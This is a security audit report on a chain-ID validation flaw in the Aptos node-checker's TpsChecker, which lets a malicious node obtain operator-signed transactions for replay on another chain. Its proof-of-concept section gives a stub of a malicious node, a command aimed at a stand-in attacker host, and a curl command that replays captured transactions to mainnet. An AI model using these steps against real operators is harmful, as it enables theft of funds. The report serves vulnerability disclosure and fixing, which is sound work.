# Audit Report

## Title
Chain ID Validation Bypass in TpsChecker Enables Cross-Chain Transaction Replay Attack

## Summary
The `TpsChecker` in the Aptos Node Health Checker obtains the `chain_id` directly from the untrusted target node's API response without verification. This allows a malicious target node to return an arbitrary chain ID, causing the node-checker to sign transactions with the wrong chain ID. These signed transactions can be captured and replayed on a different chain, potentially leading to theft of funds if the operator reuses private keys across chains.

## Finding Description

The vulnerability exists in the TpsChecker's chain_id acquisition flow. The code incorrectly trusts the target node's self-reported chain_id without independent validation: [1](#0-0) 

The `chain_id` is obtained directly from `target_api_index_provider.provide()` which queries the target node's REST API endpoint. This chain_id is then used to create transactions that will be signed by the operator's private key: [2](#0-1) 

The misleading comment claims validation occurs elsewhere: [3](#0-2) 

However, this claim is false. While a `NodeIdentityChecker` exists that validates chain_id matching between baseline and target, it runs **concurrently** with TpsChecker, not before it: [4](#0-3) 

The signed transactions use the chain_id as part of the RawTransaction structure that gets signed: [5](#0-4) 

When the transaction emitter creates transactions, it uses the compromised chain_id: [6](#0-5) 

Additionally, the Cluster's validation is circular - it validates that instances match the provided chain_id, but since the instance IS the malicious target node, it will return the same malicious chain_id: [7](#0-6) 

**Attack Flow:**

1. Operator runs node-checker TPS test against a malicious node (e.g., supposedly on testnet with chain_id=2)
2. Malicious node's API returns mainnet chain_id=1 instead
3. TpsChecker creates a `Cluster` with chain_id=1
4. TpsChecker signs account creation and coin transfer transactions with chain_id=1 using the operator's `coin_source_key`
5. These signed transactions are submitted to the malicious node via REST API where they can be intercepted
6. If the operator uses the same `coin_source_key` on mainnet with funds, the attacker replays the captured transactions on mainnet
7. Funds are drained from the operator's mainnet account through the replayed transfers

## Impact Explanation

This vulnerability qualifies as **Critical** severity under the Aptos Bug Bounty "Loss of Funds (theft or minting)" category.

**Direct Fund Theft Scenario:**
If an operator uses the same private key across multiple chains (common in testing environments), an attacker can:
- Capture signed transactions with the wrong chain_id
- Replay them on the target chain to steal funds
- The transactions are legitimate coin transfers signed by the victim's key

**Scale of Impact:**
The TpsChecker creates numerous transactions (account creations and transfers) during each test run. The exact amount stolen depends on:
- The `coins_per_account_override` and `num_accounts` configuration
- The balance in the operator's account on the target chain
- Default configurations can result in significant fund transfers

**Security Guarantee Violated:**
The system fails to enforce the critical security invariant that "chain_id must be validated before signing transactions." The chain_id is a replay protection mechanism, and accepting it from an untrusted source completely undermines this protection.

## Likelihood Explanation

**Likelihood: MEDIUM to HIGH**

**Attacker Requirements:**
- Ability to run a malicious node (trivial - anyone can run a node)
- Victim must test against the malicious node (realistic - node operators regularly test nodes)
- No special privileges or validator access required

**Key Reuse Across Chains:**
While key reuse across production chains is discouraged, it is **common in testing scenarios**:
- Developers testing on testnet and devnet often reuse keys
- The same key might exist on testnet (with test funds) and mainnet (with real funds)
- CI/CD pipelines may use the same keys across environments

**Sequence Number Alignment:**
Transaction replay requires matching sequence numbers. This is achievable because:
- Fresh accounts have sequence number 0
- Attacker can wait for sequence numbers to align naturally
- The TpsChecker creates predictable transaction patterns

**Exploitation Complexity:**
The attack is straightforward - simply return a different chain_id from the API. No complex timing or race conditions required.

## Recommendation

**Immediate Fix:**

1. **Enforce Chain ID Validation Before TPS Testing:**
   Modify TpsChecker to validate the target's chain_id against a trusted baseline **before** signing any transactions:

```rust
async fn check(
    &self,
    providers: &ProviderCollection,
) -> Result<Vec<CheckResult>, CheckerError> {
    // Get baseline chain_id from trusted source
    let baseline_api_index_provider = get_provider!(
        providers.baseline_api_index_provider,
        self.config.common.required,
        ApiIndexProvider
    );
    let baseline_response = baseline_api_index_provider.provide().await?;
    let expected_chain_id = ChainId::new(baseline_response.chain_id);
    
    let target_api_index_provider = get_provider!(
        providers.target_api_index_provider,
        self.config.common.required,
        ApiIndexProvider
    );
    
    // Validate target chain_id matches baseline
    let target_response = match target_api_index_provider.provide().await {
        Ok(response) => response,
        Err(err) => {
            return Ok(vec![Self::build_result(
                "Failed to get chain ID of your node".to_string(),
                0,
                format!("There was an error querying your node's API: {:#}", err),
            )]);
        },
    };
    
    let target_chain_id = ChainId::new(target_response.chain_id);
    
    // CRITICAL: Validate chain_id before proceeding
    if target_chain_id != expected_chain_id {
        return Ok(vec![Self::build_result(
            "Chain ID mismatch - TPS test aborted".to_string(),
            0,
            format!(
                "Target node reports chain_id {} but baseline expects {}. \
                 Refusing to sign transactions with mismatched chain_id.",
                target_chain_id.id(),
                expected_chain_id.id()
            ),
        )]);
    }
    
    // Use validated chain_id
    let chain_id = expected_chain_id;
    
    // ... rest of the function
}
```

2. **Add Explicit Checker Dependencies:**
   Modify the runner to enforce that NodeIdentityChecker must complete successfully before TpsChecker runs.

3. **Update Misleading Comment:**
   Fix the incorrect comment at lines 102-104 that claims validation already occurs.

## Proof of Concept

**Setup:**
1. Operator has a `coin_source_key` with funds on both testnet (chain_id=2) and mainnet (chain_id=1)
2. Operator runs node-checker to test a malicious node claiming to be on testnet

**Malicious Node Implementation:**
```rust
// Malicious node returns mainnet chain_id instead of testnet
// In the API handler:
pub async fn get_index() -> IndexResponse {
    IndexResponse {
        chain_id: 1, // Return mainnet chain_id instead of testnet (2)
        // ... other fields
    }
}
```

**Attack Execution:**
```bash
# Operator runs TPS check against malicious node
$ node-checker check \
    --baseline-configuration-id testnet_fullnode \
    --node-url http://malicious-node.attacker.com \
    --api-port 8080

# Behind the scenes:
# 1. TpsChecker queries malicious node, receives chain_id=1
# 2. TpsChecker creates transactions signed with chain_id=1
# 3. Example signed transaction (hex-encoded):
#    - Sender: 0x[operator_address]
#    - Payload: aptos_coin_transfer(receiver, amount)
#    - chain_id: 1 (mainnet)
#    - Signature: [valid signature from operator's key]
# 4. Transaction submitted to malicious node via POST /transactions
# 5. Malicious node captures the signed transaction
```

**Fund Theft:**
```bash
# Attacker replays captured transaction on mainnet
$ curl -X POST https://mainnet.aptoslabs.com/v1/transactions \
    -H "Content-Type: application/x.aptos.signed_transaction+bcs" \
    --data-binary @captured_signed_transaction.bcs

# Transaction executes successfully on mainnet because:
# - Signature is valid (signed by operator's key)
# - chain_id matches (transaction has chain_id=1 for mainnet)
# - Sequence number is correct (or attacker waits for it to match)
# Result: Funds transferred from operator's mainnet account
```

**Verification:**
Run a test where:
1. Mock target node returns chain_id=99
2. Observe that TpsChecker proceeds with signing transactions using chain_id=99
3. Verify NodeIdentityChecker fails concurrently but doesn't stop TpsChecker
4. Confirm signed transactions contain chain_id=99 and are submitted to target node

This demonstrates that chain_id validation is bypassed and malicious values are accepted for transaction signing.

## Notes

**Important Context:**

1. **Node-Checker Purpose**: The Aptos Node Health Checker is a service used by node operators to validate their nodes meet performance and security requirements. It's commonly used in both testing and production environments.

2. **Key Management Practices**: While production security best practices recommend unique keys per chain, testing environments frequently reuse keys across testnet, devnet, and local networks. This makes the vulnerability practically exploitable.

3. **Concurrent Checker Execution**: The architectural decision to run checkers concurrently for performance means individual checkers cannot rely on others completing first. This design requires each checker to independently validate its security assumptions.

4. **Transaction Visibility**: All signed transactions are transmitted to the target node via HTTP REST API, making interception trivial for the node operator.

5. **Mitigation Difficulty**: Operators cannot easily mitigate this by avoiding key reuse, since the node-checker's design requires providing a funding key. The fix must be in the code itself.

### Citations

**File:** ecosystem/node-checker/src/checker/tps.rs (L102-104)
```rust
    // You'll see that we're using the baseline chain ID here. This is okay
    // because at this point we've already asserted the baseline and target
    // have the same chain id.
```

**File:** ecosystem/node-checker/src/checker/tps.rs (L119-128)
```rust
        let chain_id = match target_api_index_provider.provide().await {
            Ok(response) => ChainId::new(response.chain_id),
            Err(err) => {
                return Ok(vec![Self::build_result(
                    "Failed to get chain ID of your node".to_string(),
                    0,
                    format!("There was an error querying your node's API: {:#}", err),
                )]);
            },
        };
```

**File:** ecosystem/node-checker/src/checker/tps.rs (L130-136)
```rust
        let cluster_config = ClusterArgs {
            targets: Some(vec![target_url; self.config.repeat_target_count]),
            targets_file: None,
            coin_source_args: self.config.coin_source_args.clone(),
            chain_id: Some(chain_id),
            node_api_key: None,
        };
```

**File:** ecosystem/node-checker/src/runner/sync_runner.rs (L155-163)
```rust
        // Call each of the Checkers without awaiting them yet.
        let mut futures = Vec::new();
        for checker in &self.checkers {
            futures.push(self.call_check(checker, &provider_collection));
        }

        // Run all the Checkers concurrently and collect their results.
        let check_results: Vec<CheckResult> =
            try_join_all(futures).await?.into_iter().flatten().collect();
```

**File:** types/src/transaction/mod.rs (L179-205)
```rust
pub struct RawTransaction {
    /// Sender's address.
    sender: AccountAddress,

    /// Sequence number of this transaction. This must match the sequence number
    /// stored in the sender's account at the time the transaction executes.
    sequence_number: u64,

    /// The transaction payload, e.g., a script to execute.
    payload: TransactionPayload,

    /// Maximal total gas to spend for this transaction.
    max_gas_amount: u64,

    /// Price to be paid per gas unit.
    gas_unit_price: u64,

    /// Expiration timestamp for this transaction, represented
    /// as seconds from the Unix Epoch. If the current blockchain timestamp
    /// is greater than or equal to this time, then the transaction has
    /// expired and will be discarded. This can be set to a large value far
    /// in the future to indicate that a transaction does not expire.
    expiration_timestamp_secs: u64,

    /// Chain ID of the Aptos network this transaction is intended for.
    chain_id: ChainId,
}
```

**File:** crates/transaction-emitter-lib/src/wrappers.rs (L92-98)
```rust
    let emitter = TxnEmitter::new(
        TransactionFactory::new(cluster.chain_id)
            .with_transaction_expiration_time(args.txn_expiration_time_secs)
            .with_gas_unit_price(aptos_global_constants::GAS_UNIT_PRICE),
        StdRng::from_entropy(),
        client,
    );
```

**File:** crates/transaction-emitter-lib/src/cluster.rs (L114-120)
```rust
            if state.chain_id != chain_id.id() {
                warn!(
                    "Excluding client {} running wrong chain {}, instead of {}",
                    instance.peer_name(),
                    state.chain_id,
                    chain_id.id(),
                );
```
